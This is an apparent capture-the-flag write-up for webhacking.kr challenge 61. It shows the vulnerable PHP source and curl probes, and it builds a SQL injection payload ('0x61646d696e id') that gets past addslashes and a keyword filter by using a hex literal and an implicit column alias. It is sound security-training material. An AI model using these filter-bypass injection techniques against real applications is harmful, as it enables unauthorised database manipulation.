# Old 61    SQLi (Value as Column)

URL: [https://webhacking.kr/challenge/web-38/?view_source=1](https://webhacking.kr/challenge/web-38/?view_source=1)

```php
<?php
include "../../config.php";
if ($_GET["view_source"]) { view_source(); }

$db = dbconnect();
if (!$_GET["id"]) { $_GET["id"] = "guest"; }

echo "<html><head><title>Challenge 61</title></head><body>";
echo "<a href=./?view_source=1>view-source</a><hr>";

$_GET["id"] = addslashes($_GET["id"]);

if (preg_match("/\(|\)|select|from|,|by|\./i", $_GET["id"])) { exit("Access Denied"); }
if (strlen($_GET["id"]) > 15) { exit("Access Denied"); }

$result = mysqli_fetch_array(
    mysqli_query(
        $db, "select {$_GET["id"]} from chall61 order by id desc limit 1"
    )
);

echo "<b>{$result["id"]}</b><br>";
if ($result["id"] == "admin") { solve(61); }
echo "</body></html>";
?>
```

In this SQLi challenge we control what is selected from table. Restriction seems to be that we can't use subqueries.

```bash
└─$ curl 'https://webhacking.kr/challenge/web-38/?id=guest' -b 'PHPSESSID=fqn9tv8tbam8b4gi2edk8vc8bu' -s | grep -oE '<b>(.*)</b>'
<b></b>
└─$ curl 'https://webhacking.kr/challenge/web-38/?id=id' -b 'PHPSESSID=fqn9tv8tbam8b4gi2edk8vc8bu' -s | grep -oE '<b>(.*)</b>'
<b>test</b>
└─$ curl 'https://webhacking.kr/challenge/web-38/?id=*' -b 'PHPSESSID=fqn9tv8tbam8b4gi2edk8vc8bu' -s | grep -oE '<b>(.*)</b>'
<b>test</b>
```

The table only has 1 column, but we need `id` to be `admin`. This can be injected via like `"admin" as id` which should return admin. 
```bash
└─$ curl 'https://webhacking.kr/challenge/web-38/?id=1337+as+id' -b 'PHPSESSID=fqn9tv8tbam8b4gi2edk8vc8bu' -s | grep -oE '<b>(.*)</b>'
<b>1337</b>
```

`addslashes` function prevents usage of quotes, but MySQL allows hex strings. `admin` -> `0x61646d696e`

Payload will be `0x61646d696e as id`, but we get Access Denied because of length. Another thing about `value as column` is that `as` keyword can be omitted.

Final payload: `0x61646d696e id`

![old-61.png](/assets/ctf/webhacking.kr/old-61.png)